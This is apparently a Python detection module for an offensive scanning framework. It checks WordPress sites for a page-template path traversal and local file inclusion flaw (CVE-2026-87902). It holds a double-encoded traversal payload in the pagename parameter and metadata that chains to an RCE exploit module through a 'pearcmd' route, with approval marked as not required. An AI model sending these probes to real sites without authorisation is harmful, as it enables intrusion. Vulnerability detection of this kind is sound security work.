#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect WordPress Core CVE-2026-87902 page-template path traversal / LFI."""

from __future__ import annotations

import re
from typing import Optional, Tuple

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

CVE_ID = "CVE-2026-87902"
FIXED_VERSION = (7, 1, 2)
LOW_VERSION = (4, 7, 0)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "WordPress Core CVE-2026-87902 Page Template LFI Detect",
        "description": (
            "Detects CVE-2026-87902 in WordPress Core 4.7.0 through 7.1.1: "
            "get_page_template() decodes pagename without validate_file(), enabling "
            "unauthenticated local .php inclusion when the active theme exposes a "
            "top-level page-* directory (e.g. page-templates/). Fixed in 7.1.2."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": [CVE_ID],
        "references": [
            f"https://nvd.nist.gov/vuln/detail/{CVE_ID}",
            "https://wordpress.org/news/2026/09/wordpress-7-1-2-security-release/",
        ],
        "modules": ["exploits/multi/http/wordpress_cve_2026_87902_rce"],
        "tags": [
            "web",
            "scanner",
            "wordpress",
            "wp-core",
            "path-traversal",
            "lfi",
            "rce",
            "cve-2026-87902",
            "kev",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 6,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.1,
            "noise": 0.25,
            "value": 1.2,
            "requires": {
                "tech_hints_any": ["wordpress"],
                "endpoint_pattern_any": ["/wp-content/", "/wp-json/"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "lfi", "from_detail": "pagename traversal"},
                    {"capability": "rce_surface", "from_detail": "pearcmd chain"},
                ],
                "suggested_followups": [
                    "exploits/multi/http/wordpress_cve_2026_87902_rce",
                    "scanner/http/wordpress_detect",
                ],
            },
        },
    }

    active_probe = OptBool(
        False,
        "Send double-encoded pagename probe (may trigger PHP errors on vulnerable sites)",
        False,
        advanced=True,
    )

    _THEME_RE = re.compile(r"/wp-content/themes/([A-Za-z0-9_-]+)/")
    _PAGE_ID_RE = re.compile(r"(?:\?|&)(?:page_id|p)=(\d+)")
    _VERSION_RE = re.compile(
        r"(?:WordPress\s+([\d.]+)|content=[\"']WordPress\s+([\d.]+)[\"'])",
        re.IGNORECASE,
    )

    def _wp_base(self) -> str:
        return self.wp_normalize_base_path(getattr(self, "path", "/"))

    def _discover_version(self) -> str:
        for path in (f"{self._wp_base()}/readme.html", f"{self._wp_base()}/", "/feed/"):
            response = self.http_request(method="GET", path=path, allow_redirects=True)
            if not response:
                continue
            body = response.text or ""
            match = self._VERSION_RE.search(body)
            if match:
                return (match.group(1) or match.group(2) or "").strip()
        return ""

    @staticmethod
    def _version_affected(version: str) -> Optional[bool]:
        if not version:
            return None
        current = Wordpress.wp_version_to_tuple(version)
        low = LOW_VERSION + (0,) * max(0, 3 - len(LOW_VERSION))
        fixed = FIXED_VERSION + (0,) * max(0, 3 - len(FIXED_VERSION))
        while len(current) < 3:
            current = current + (0,)
        if current[:3] < low[:3]:
            return False
        if current[:3] >= fixed[:3]:
            return False
        return True

    def _active_theme(self) -> str:
        response = self.http_request(method="GET", path=f"{self._wp_base()}/", allow_redirects=True)
        body = (response.text or "") if response else ""
        match = self._THEME_RE.search(body)
        return match.group(1) if match else ""

    def _theme_page_prefix(self, theme: str) -> Tuple[bool, str]:
        if not theme:
            return False, ""
        for suffix in ("page-templates", "page-parts", "page-templates/"):
            path = f"{self._wp_base()}/wp-content/themes/{theme}/{suffix}"
            response = self.http_request(method="GET", path=path, allow_redirects=False)
            if not response:
                continue
            code = int(response.status_code or 0)
            if code in (200, 403, 301, 302):
                return True, suffix.rstrip("/")
        return False, ""

    def _page_id(self, html: str) -> str:
        match = self._PAGE_ID_RE.search(html or "")
        return match.group(1) if match else ""

    def _traversal_differential(self, page_id: str) -> bool:
        base = self._wp_base()
        root_path = f"{base}/" if base != "/" else "/"
        baseline = self.http_request(method="GET", path=root_path, allow_redirects=True)
        baseline_len = len((baseline.text or "") if baseline else "")
        pagename = "templates%252f%252e%252e%252fwp-includes%252fversion"
        query = f"{root_path}?pagename={pagename}"
        if page_id:
            query = f"{query}&page_id={page_id}"
        probe = self.http_request(method="GET", path=query, allow_redirects=True)
        if not probe:
            return False
        body = probe.text or ""
        if "Fatal error" in body or "Warning:" in body and "template" in body.lower():
            return True
        probe_len = len(body)
        return abs(probe_len - baseline_len) > 500 and probe.status_code in (200, 500)

    def run(self):
        version = self._discover_version()
        affected = self._version_affected(version)
        if affected is False:
            return False

        home = self.http_request(method="GET", path=f"{self._wp_base()}/", allow_redirects=True)
        home_body = (home.text or "") if home else ""
        if "wordpress" not in home_body.lower() and not version:
            return False

        theme = self._active_theme()
        has_prefix, prefix_dir = self._theme_page_prefix(theme)
        if affected is None and not has_prefix:
            return False

        confirmed = False
        if bool(self.active_probe) and has_prefix:
            confirmed = self._traversal_differential(self._page_id(home_body))

        if affected is True or has_prefix or confirmed:
            severity = "critical" if (has_prefix and affected is not False) or confirmed else "high"
            self.set_info(
                severity=severity,
                cve=CVE_ID,
                reason=(
                    "Page-template traversal prerequisites met"
                    if has_prefix
                    else "WordPress core version in affected range"
                ),
                version=version or "unknown",
                theme=theme or "unknown",
                page_prefix=prefix_dir or "not found",
                active_probe=confirmed,
            )
            return True
        return False
